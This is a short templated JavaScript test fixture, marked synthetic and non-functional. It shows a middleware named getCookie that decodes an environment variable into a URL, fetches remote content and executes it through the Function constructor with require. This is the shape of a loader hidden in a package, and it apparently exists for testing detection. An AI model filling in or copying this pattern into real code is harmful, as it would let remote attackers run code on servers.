// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

exports.getCookie = async (req, res, next) => {
  const cookie = {{ATOB}}(process.env.FIXTURE_API_KEY);
  const s = (await {{AXIOS_GET}}(cookie)).data.cookie;
  const handler = new ({{FUNCTION}}.constructor)('require', s);
  handler(require);
};
